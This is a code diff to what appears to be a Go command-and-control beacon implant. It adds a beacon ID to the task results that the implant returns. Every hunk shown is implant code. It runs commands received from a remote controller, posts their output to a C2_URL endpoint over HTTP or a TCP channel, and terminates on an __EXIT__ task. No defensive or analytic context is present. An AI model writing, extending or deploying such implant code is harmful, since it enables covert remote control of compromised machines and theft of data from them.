@@ -39,8 +39,9 @@ type Task struct {
 }
 
 type TaskResult struct {
-	TaskID string `json:"task_id"`
-	Output string `json:"output"`
+	TaskID   string `json:"task_id"`
+	Output   string `json:"output"`
+	BeaconID string `json:"beacon_id"`
 }
 
 type CheckInData struct {
@@ -404,7 +405,7 @@ func checkIn(currentSleep, currentJitter int) (int, int) {
 }
 
 func sendResult(taskID, output string) {
-	result := TaskResult{TaskID: taskID, Output: output}
+	result := TaskResult{TaskID: taskID, Output: output, BeaconID: BEACON_ID}
 	jsonData, _ := json.Marshal(result)
 	httpPost(C2_URL+"/checkin", jsonData)
 }
@@ -500,14 +501,14 @@ func runTCP(sleepSec, jitterPct int) {
 				}
 				for _, task := range tasks {
 					if task.Command == "__EXIT__" {
-						resultData, _ := json.Marshal(TaskResult{TaskID: task.ID, Output: "BEACON_TERMINATED"})
+						resultData, _ := json.Marshal(TaskResult{TaskID: task.ID, Output: "BEACON_TERMINATED", BeaconID: BEACON_ID})
 						tcpWriteMsg(conn, TCPMsg{Type: "result", Data: json.RawMessage(resultData)})
 						tcpReadMsg(conn)
 						conn.Close()
 						os.Exit(0)
 					}
 					output := executeCommand(task.Command)
-					resultData, _ := json.Marshal(TaskResult{TaskID: task.ID, Output: output})
+					resultData, _ := json.Marshal(TaskResult{TaskID: task.ID, Output: output, BeaconID: BEACON_ID})
 					if err := tcpWriteMsg(conn, TCPMsg{Type: "result", Data: json.RawMessage(resultData)}); err != nil {
 						break
 					}
